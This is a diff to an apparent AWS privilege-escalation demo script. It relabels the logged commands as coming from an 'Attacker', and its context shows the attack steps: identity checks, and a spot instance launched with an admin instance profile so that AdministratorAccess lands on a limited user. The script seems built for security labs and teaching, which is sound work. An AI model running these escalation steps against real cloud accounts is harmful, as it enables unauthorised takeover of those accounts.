@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -88,7 +90,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -100,7 +102,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -108,7 +110,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Check current permissions (should be limited)
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -147,7 +149,7 @@ echo -e "${GREEN}✓ User-data script prepared${NC}\n"
 
 # Step 6: Get AMI ID for EC2 instance
 echo -e "${YELLOW}Step 6: Finding Amazon Linux 2023 AMI${NC}"
-show_cmd aws ec2 describe-images --region "$AWS_REGION" --owners amazon --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text
+show_cmd "Attacker" "aws ec2 describe-images --region "$AWS_REGION" --owners amazon --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text"
 AMI_ID=$(aws ec2 describe-images \
     --region $AWS_REGION \
     --owners amazon \
@@ -157,7 +159,7 @@ AMI_ID=$(aws ec2 describe-images \
 
 if [ -z "$AMI_ID" ] || [ "$AMI_ID" = "None" ]; then
     echo -e "${YELLOW}Could not find Amazon Linux 2023 AMI, trying Amazon Linux 2...${NC}"
-    show_cmd aws ec2 describe-images --region "$AWS_REGION" --owners amazon --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" "Name=state,Values=available" --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text
+    show_cmd "Attacker" "aws ec2 describe-images --region "$AWS_REGION" --owners amazon --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" "Name=state,Values=available" --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text"
     AMI_ID=$(aws ec2 describe-images \
         --region $AWS_REGION \
         --owners amazon \
@@ -178,7 +180,7 @@ echo -e "${GREEN}✓ Found AMI${NC}\n"
 echo -e "${YELLOW}Step 7: Determining VPC and subnet for spot instance${NC}"
 
 # Get default VPC and subnet
-show_cmd aws ec2 --region "$AWS_REGION" describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text
+show_cmd "Attacker" "aws ec2 --region "$AWS_REGION" describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text"
 DEFAULT_VPC=$(aws ec2 --region $AWS_REGION describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text)
 
 if [ "$DEFAULT_VPC" = "None" ] || [ -z "$DEFAULT_VPC" ]; then
@@ -187,7 +189,7 @@ if [ "$DEFAULT_VPC" = "None" ] || [ -z "$DEFAULT_VPC" ]; then
     exit 1
 fi
 
-show_cmd aws --region "$AWS_REGION" ec2 describe-subnets --filters "Name=vpc-id,Values=$DEFAULT_VPC" --query 'Subnets[0].SubnetId' --output text
+show_cmd "Attacker" "aws --region "$AWS_REGION" ec2 describe-subnets --filters "Name=vpc-id,Values=$DEFAULT_VPC" --query 'Subnets[0].SubnetId' --output text"
 DEFAULT_SUBNET=$(aws --region $AWS_REGION ec2 describe-subnets --filters "Name=vpc-id,Values=$DEFAULT_VPC" --query 'Subnets[0].SubnetId' --output text)
 
 echo "Using VPC: $DEFAULT_VPC"
@@ -226,7 +228,7 @@ echo "This is the privilege escalation vector - passing the admin role to a spot
 echo "Instance profile: $INSTANCE_PROFILE"
 
 # Request spot instance
-show_attack_cmd aws ec2 request-spot-instances --region "$AWS_REGION" --spot-price "0.05" --instance-count 1 --type "one-time" --launch-specification "$LAUNCH_SPEC" --output json
+show_attack_cmd "Attacker" "aws ec2 request-spot-instances --region "$AWS_REGION" --spot-price "0.05" --instance-count 1 --type "one-time" --launch-specification "$LAUNCH_SPEC" --output json"
 SPOT_REQUEST_OUTPUT=$(aws ec2 request-spot-instances \
     --region $AWS_REGION \
     --spot-price "0.05" \
@@ -256,7 +258,7 @@ INSTANCE_ID=""
 
 while [ $WAIT_TIME -lt $MAX_WAIT ]; do
     # Check spot request status
-    show_cmd aws ec2 describe-spot-instance-requests --region "$AWS_REGION" --spot-instance-request-ids "$SPOT_REQUEST_ID" --query 'SpotInstanceRequests[0]' --output json
+    show_cmd "Attacker" "aws ec2 describe-spot-instance-requests --region "$AWS_REGION" --spot-instance-request-ids "$SPOT_REQUEST_ID" --query 'SpotInstanceRequests[0]' --output json"
     SPOT_STATUS=$(aws ec2 describe-spot-instance-requests \
         --region $AWS_REGION \
         --spot-instance-request-ids $SPOT_REQUEST_ID \
@@ -328,7 +330,7 @@ echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
 echo "The starting user now has AdministratorAccess attached..."
 echo "Attempting to list IAM users..."
 
-show_cmd aws iam list-users --max-items 3 --output table
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
